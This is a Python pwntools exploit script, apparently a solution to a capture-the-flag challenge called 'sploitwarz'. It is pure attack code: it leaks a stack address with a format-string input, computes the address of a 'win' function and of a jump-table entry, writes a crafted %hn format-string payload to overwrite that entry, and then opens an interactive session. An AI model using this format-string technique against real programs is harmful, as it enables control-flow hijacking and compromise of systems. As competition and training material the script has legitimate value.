from pwn import *
import sys

fib = [0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765]
context.terminal = ['tmux', 'splitw', '-h']

p = process('./sploitwarz')
# p = remote("plzpwn.me", "4003")
pause()
p.recv()
p.sendline('%147$#x')
p.recv()
p.sendline('g')
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
leak = int(p.recv(10), 16)
win = leak - 3135
gotcha = win + 10888
win32 = p32(win)
n1 = ord(win32[3])*256 + ord(win32[2]) - 23
n2 = ord(win32[1])*256 + ord(win32[0]) - n1 - 0x1f

formatStr = fit({
    0: p32(gotcha+2),
    4: p32(gotcha+0),
    20: "%%%dx" % (n1),
    30: "%5$hn",
    40: "%%%dx" % (n2),
    50: "%6$hn"
    })

print(formatStr)
print("exit is at " + hex(gotcha))
print("win is at " + hex(win))

p.recv()
p.sendline("\nc")
p.recv()
p.sendline(formatStr)
p.sendline("\n")
p.recv()
p.sendline("g")
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
p.interactive()
